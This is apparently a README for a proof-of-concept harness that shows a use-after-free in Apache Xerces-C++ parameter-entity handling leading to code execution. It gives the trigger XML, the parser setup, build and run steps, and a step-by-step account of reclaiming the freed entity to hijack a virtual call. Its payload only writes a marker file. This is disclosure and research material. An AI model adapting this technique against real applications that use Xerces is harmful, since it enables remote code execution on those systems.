# Xerces-C++ PE Entity UAF RCE PoC

Tiny proof harness for Apache Xerces-C++ at commit
`53c0401812bfe5523594c1180f5ac7c758a2eaf7`.

The bug is a parameter-entity lifetime mismatch! Xerces keeps a PE entity pointer in
`ReaderMgr` after `DTDScanner` frees the PE declaration pool. The PoC uses a normal advanced
document handler callback window to reclaim the freed entity slot, then reaches a virtual method
through the stale `XMLEntityDecl&` delivered by Xerces.

The payload writes `/tmp/xerces_uaf_rce_proof` and exits with
`42`.

## Status

Verified locally against an unmodified checkout at the pinned commit.

```text
commit: 53c0401812bfe5523594c1180f5ac7c758a2eaf7
tracked diff under src/xercesc: 0 bytes
result: rc=42, proof=xerces-uaf-rce
```

## Files

- `poc_xerces_rce.cpp` - standalone proof harness
- `trigger.xml` - the XML shape used by the harness
- `build.sh` - builds against a local Xerces checkout/build
- `run.sh` - runs the proof and checks the marker file

## Trigger

```xml
<!DOCTYPE r [<!ELEMENT r ANY><!ENTITY% pe1 ">D><r>hello">
 %pe1;
```

`>D><r>hello` makes DTD scanning recover in a way that leaves the PE reader
alive after `DTDScanner` is destroyed, then continues into document content from that reader

## Build

Point the script at the pinned Xerces source checkout and build dir:

```bash
XERCES_SRC=/path/to/xerces-c \
XERCES_BUILD=/path/to/xerces-build \
./build.sh
```

the script links directly against:

```text
$XERCES_BUILD/src/libxerces-c-4.0.so
```

## Run

```bash
./run.sh
```

Expected output shape:

```text
[*] endEntityReference dangling entity=0x..., first reclaim=0x...
[+] control flow reached ReclaimedEntity::getIsParameter, this=0x...
rc=42
proof=xerces-uaf-rce
[+] code execution proof hit
```

## Required Parser Setup

The proof uses public Xerces APIs only:

```cpp
parser.setValidationScheme(SAXParser::Val_Auto);
parser.setDoNamespaces(true);
parser.setExitOnFirstFatalError(false);
parser.setValidationConstraintFatal(false);
parser.installAdvDocHandler(&docHandler);
parser.setErrorHandler(&errHandler);
```

`setExitOnFirstFatalError(false)` is needed so the malformed DTD path keeps going long enough to
reach the propagated PE content. `installAdvDocHandler()` is the public advanced document handler API
that receives `endEntityReference()`.

## Why It Works

1. `DTDScanner::expandPERef()` pushes the PE reader with a non-adopted entity pointer:

   ```cpp
   fReaderMgr->pushReader(reader, decl);
   ```

2. `decl` is still owned by `DTDScanner::fPEntityDeclPool`.
3. `DTDScanner::~DTDScanner()` frees the PE `DTDEntityDecl` while `ReaderMgr` still reference it
4. Parsing continues from the propagated PE reader and calls `docCharacters()`
5. The PoC allocates same-size `XMemory` objects in that callback and reclaims the freed entity slot
6. PE end-of-entity throws `EndOfEntityException` with the stale pointer
7. `IGXMLScanner::scanContent()` forwards the stale reference:

   ```cpp
   fDocHandler->endEntityReference(toCatch.getEntity());
   ```

8. A virtual call on that `XMLEntityDecl&` dispatches through the reclaimed objects vtable

## Why RCE?

The proof reaches a valid virtual method on the reclaimed object:

```text
ReclaimedEntity::getIsParameter()
```

That method writes a marker file through `system()`:

```text
/tmp/xerces_uaf_rce_proof = xerces-uaf-rce
```

The process exits with `42` only if that virtual method was reached.

## Limits

This is a harness proof, not a universal exploit for every Xerces consumer. The target application
needs to use the advanced document handler path and query entity metadata in `endEntityReference()`.
Xerces itself is unmodified: the UAF, stale reference,
callback ordering, reclaim window, and final dispatch all happen against stock Xerces-C++ at the
pinned commit
